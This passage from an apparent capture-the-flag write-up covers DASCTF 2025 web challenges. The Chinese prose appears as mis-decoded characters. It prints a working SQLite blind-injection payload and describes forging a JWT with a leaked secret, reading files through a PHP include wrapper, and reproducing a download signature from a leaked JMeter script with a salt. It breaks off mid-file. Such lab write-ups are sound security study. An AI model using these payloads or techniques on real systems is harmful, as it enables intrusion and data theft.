class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>é‚£ä¹ˆé¦–å…ˆè¦è·å¾— secret ä¿®æ”¹ role</p><p>å°è¯•ç›²æ³¨ï¼Œå»¶æ—¶ä¼šè¿”å› 502ï¼ŒæˆåŠŸè¿”å› 302</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">0</span><span class="token string">'union select 1,2,(case when(1>3) then 3 else abs(0x8000000000000000) end)--0'</span><span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">case</span> <span class="token keyword">when</span><span class="token punctuation">(</span>substr<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> hex<span class="token punctuation">(</span>group_concat<span class="token punctuation">(</span><span class="token keyword">sql</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">from</span> sqlite_master<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token string">'!'</span><span class="token punctuation">)</span> <span class="token keyword">then</span> <span class="token number">3</span> <span class="token keyword">else</span> randomblob<span class="token punctuation">(</span><span class="token number">100000000</span><span class="token punctuation">)</span> <span class="token keyword">end</span><span class="token punctuation">)</span><span class="token comment">--</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>å¾—åˆ°è¡¨ç»“æ„ï¼š</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">CREATE</span> <span class="token keyword">TABLE</span> users <span class="token punctuation">(</span>id <span class="token keyword">INTEGER</span> <span class="token keyword">PRIMARY</span> <span class="token keyword">KEY</span><span class="token punctuation">,</span> username <span class="token keyword">TEXT</span><span class="token punctuation">,</span> password <span class="token keyword">TEXT</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å†æ³¨ä¸‹å»å‘ç°æ•°æ®åº“çœŸæ˜¯ç©ºçš„ï¼Œç”±äºç”¨çš„ <code>query</code> æŸ¥è¯¢ä¹Ÿä¸èƒ½å †å æ³¨å…¥å†™ shell</p><p>åé¢å‘ç° gallery.php çš„æ³¨é‡Šé‡Œæœ‰ secretï¼š<code>GALLERY2024SECRET</code>ï¼Œä¿®æ”¹ jwt å³å¯</p><p>ç„¶åå°±èƒ½è¿›å…¥ admin.phpï¼Œæœ‰ include æ–‡ä»¶è¯»å–ï¼Œå‘ç°ä¸èƒ½ç”¨ base64 å’Œ rot13 ç¼–ç </p><p>æµ‹è¯•å‘ç° flag åœ¨ flag.php ä¸‹ï¼Œä¼ªåè®®æ¢ä¸ªç¼–ç æ–¹å¼è¯»å‡ºæ¥</p><p><img src="/blog/2025/12/06/DASCTF-2025%E4%B8%8B%E5%8D%8A%E5%B9%B4%E8%B5%9B/20251206122706.png"></p><hr><h2 id="devweb"><a href="#devweb" class="headerlink" title="devweb"></a>devweb</h2><p>è¿™é¢˜ç»™ ai æ¢­äº†æ²¡ç»·ä½</p><p>ä¸€ä¸ª vite å‰ç«¯ï¼Œç™»å½•åŠŸèƒ½éƒ½æ²¡å†™å¥½è®¿é—®çš„æ˜¯ localhost:8080&#x2F;loginï¼Œå¼±å£ä»¤ <code>admin:123456</code> ä¼šè·³è½¬åˆ° &#x2F;dashboardï¼Œä½†æ˜¯è¿”å› 404ï¼Œå°è¯•å¯»æ‰¾å¯ç”¨æ¥å£</p><p>åœ¨é¡µé¢ js ä¸­æœ‰ä¸€ä¸ªæ–‡ä»¶ä¸‹è½½çš„æ¥å£</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> Fd <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token function">data</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token punctuation">&#123;</span>            <span class="token literal-property property">fileList</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">&#123;</span>                <span class="token literal-property property">name</span><span class="token operator">:</span> <span class="token string">"app.jmx"</span>            <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>                <span class="token literal-property property">name</span><span class="token operator">:</span> <span class="token string">"index.html"</span>            <span class="token punctuation">&#125;</span><span class="token punctuation">]</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token function">created</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">fetchFiles</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token literal-property property">methods</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>        <span class="token function">fetchFiles</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>fileList <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">&#123;</span>                <span class="token literal-property property">name</span><span class="token operator">:</span> <span class="token string">"app.jmx"</span>            <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>                <span class="token literal-property property">name</span><span class="token operator">:</span> <span class="token string">"index.html"</span>            <span class="token punctuation">&#125;</span><span class="token punctuation">]</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token function">downloadFile</span><span class="token punctuation">(</span><span class="token parameter">t</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">alert</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">æ­£åœ¨ä¸‹è½½æ–‡ä»¶: </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>t<span class="token punctuation">.</span>name<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">,</span>            window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>href <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">/download?file=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>t<span class="token punctuation">.</span>name<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">&amp;sign=6f742c2e79030435b7edc1d79b8678f6</span><span class="token template-punctuation string">`</span></span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æœ‰ app.jmx å’Œä¸€ä¸ªç­¾å <code>6f742c2e79030435b7edc1d79b8678f6</code></p><p>å°è¯•ç›´æ¥è¯»å– flag å¤±è´¥ï¼ŒçŒœæµ‹éœ€è¦ç­¾åä¹Ÿå¯¹ä¸Š</p><p>app.jmx</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version='1.0' encoding='UTF-8'?></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>jmeterTestPlan</span> <span class="token attr-name">version</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>1.2<span class="token punctuation">"</span></span> <span class="token attr-name">properties</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>5.0<span class="token punctuation">"</span></span> <span class="token attr-name">jmeter</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>5.0<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>hashTree</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>TestPlan</span> <span class="token attr-name">guiclass</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>TestPlanGui<span class="token punctuation">"</span></span> <span class="token attr-name">testclass</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>TestPlan<span class="token punctuation">"</span></span> <span class="token attr-name">testname</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Download Test with Parameters<span class="token punctuation">"</span></span> <span class="token attr-name">enabled</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>true<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>stringProp</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>TestPlan.functional_mode<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>false<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>stringProp</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>boolProp</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>TestPlan.serialize_threadgroups<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>false<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>boolProp</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>elementProp</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>TestPlan.user_defined_variables<span class="token punctuation">"</span></span> <span class="token attr-name">elementType</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Arguments<span class="token punctuation">"</span></span> <span class="token attr-name">guiclass</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>ArgumentsPanel<span class="token punctuation">"</span></span> <span class="token attr-name">testclass</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Arguments<span class="token punctuation">"</span></span> <span class="token attr-name">testname</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>User Defined Variables<span class="token punctuation">"</span></span> <span class="token attr-name">enabled</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>true<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>collectionProp</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Arguments.arguments<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>elementProp</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span> <span class="token attr-name">elementType</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Argument<span class="token punctuation">"</span></span> <span class="token attr-name">guiclass</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>HTTPArgumentPanel<span class="token punctuation">"</span></span> <span class="token attr-name">testclass</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Argument<span class="token punctuation">"</span></span> <span class="token attr-name">testname</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>mingWen<span class="token punctuation">"</span></span> <span class="token attr-name">enabled</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>true<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>stringProp</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Argument.name<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>mingWen<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>stringProp</span><span class="token punctuation">></span></span>                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>stringProp</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Argument.value<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>test<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>stringProp</span><span class="token punctuation">></span></span>                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>stringProp</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Argument.metadata<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>=<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>stringProp</span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>elementProp</span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>elementProp</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span> <span class="token attr-name">elementType</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Argument<span class="token punctuation">"</span></span> <span class="token attr-name">guiclass</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>HTTPArgumentPanel<span class="token punctuation">"</span></span> <span class="token attr-name">testclass</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Argument<span class="token punctuation">"</span></span> <span class="token attr-name">testname</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>salt<span class="token punctuation">"</span></span> <span class="token attr-name">enabled</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>true<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>stringProp</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Argument.name<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>salt<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>stringProp</span><span class="token punctuation">></span></span>                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>stringProp</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Argument.value<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>f9bc855c9df15ba7602945fb939deefc<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>stringProp</span><span class="token punctuation">></span></span>                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>stringProp</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Argument.metadata<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>=<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>stringProp</span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>elementProp</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>collectionProp</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>elementProp</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>stringProp</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>TestPlan.comments_or_notes<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>boolProp</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>TestPlan.serialize_threadgroups<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>true<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>boolProp</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>TestPlan</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>hashTree</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ThreadGroup</span> <span class="token attr-name">guiclass</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>ThreadGroupGui<span class="token punctuation">"</span></span> <span class="token attr-name">testclass</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>ThreadGroup<span class="token punctuation">"</span></span> <span class="token attr-name">testname</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>User Group<span class="token punctuation">"</span></span> <span class="token attr-name">enabled</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>true<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>stringProp</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>ThreadGroup.on_sample_error<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>continue<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>stringProp</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>elementProp</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>ThreadGroup.main_controller<span class="token punctuation">"</span></span> <span class="token attr-name">elementType</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>LoopController<span class="token punctuation">"</span></span> <span class="token attr-name">guiclass</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>LoopControlPanel<span class="token punctuation">"</span></span> <span class="token attr-name">testclass</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>LoopController<span class="token punctuation">"</span></span> <span class="token attr-name">testname</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Loop Controller<span class="token punctuation">"</span></span> <span class="token attr-name">enabled</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>true<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>boolProp</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>LoopController.continue_forever<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>false<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>boolProp</span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>intProp</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>LoopController.loops<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>intProp</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>elementProp</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>stringProp</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>ThreadGroup.num_threads<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>stringProp</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>stringProp</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>ThreadGroup.ramp_time<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>stringProp</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>longProp</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>ThreadGroup.start_time<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>longProp</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>longProp</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>ThreadGroup.end_time<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>longProp</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>boolProp</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>ThreadGroup.scheduler<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>false<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>boolProp</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>stringProp</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>ThreadGroup.duration<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>stringProp</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>stringProp</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>ThreadGroup.delay<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>stringProp</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>boolProp</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>ThreadGroup.same_user_on_next_iteration<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>true<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>boolProp</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ThreadGroup</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>hashTree</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>JSR223PreProcessor</span> <span class="token attr-name">guiclass</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>JSR223Panel<span class="token punctuation">"</span></span> <span class="token attr-name">testclass</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>JSR223PreProcessor<span class="token punctuation">"</span></span> <span class="token attr-name">testname</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Calculate Sign<span class="token punctuation">"</span></span> <span class="token attr-name">enabled</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>true<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>stringProp</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>JSR223PreProcessor.language<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>groovy<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>stringProp</span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>stringProp</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>JSR223PreProcessor.parameters<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>import org.apache.commons.codec.digest.DigestUtils;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>stringProp</span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>stringProp</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>JSR223PreProcessor.reset_vars<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>false<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>stringProp</span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>stringProp</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>JSR223PreProcessor.clear_stack<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>false<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>stringProp</span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>stringProp</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>JSR223PreProcessor.script<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                        def mingWen = vars.get('mingWen');                        def firstMi = DigestUtils.md5Hex(mingWen);                        def jieStr = firstMi.substring(5, 16);                        def salt = vars.get('salt');                        def newStr = firstMi + jieStr + salt;                        def sign = DigestUtils.md5Hex(newStr);                        vars.put('sign', sign);                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>stringProp</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>JSR223PreProcessor</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>hashTree</span><span class="token punctuation">/></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>HTTPSamplerProxy</span> <span class="token attr-name">guiclass</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>HttpTestSampleGui<span class="token punctuation">"</span></span> <span class="token attr-name">testclass</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>HTTPSamplerProxy<span class="token punctuation">"</span></span> <span class="token attr-name">testname</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Download File<span class="token punctuation">"</span></span> <span class="token attr-name">enabled</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>true<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>boolProp</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>HTTPSampler.postBodyRaw<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>false<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>boolProp</span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>stringProp</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Comment<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>elementProp</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>HTTPsampler.Arguments<span class="token punctuation">"</span></span> <span class="token attr-name">elementType</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Arguments<span class="token punctuation">"</span></span> <span class="token attr-name">guiclass</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>HTTPArgumentsPanel<span class="token punctuation">"</span></span> <span class="token attr-name">testclass</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Arguments<span class="token punctuation">"</span></span> <span class="token attr-name">testname</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>User Defined Variables<span class="token punctuation">"</span></span> <span class="token attr-name">enabled</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>true<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>collectionProp</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Arguments.arguments<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>elementProp</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span> <span class="token attr-name">elementType</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Argument<span class="token punctuation">"</span></span> <span class="token attr-name">guiclass</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>HTTPArgumentPanel<span class="token punctuation">"</span></span> <span class="token attr-name">testclass</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Argument<span class="token punctuation">"</span></span> <span class="token attr-name">testname</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span 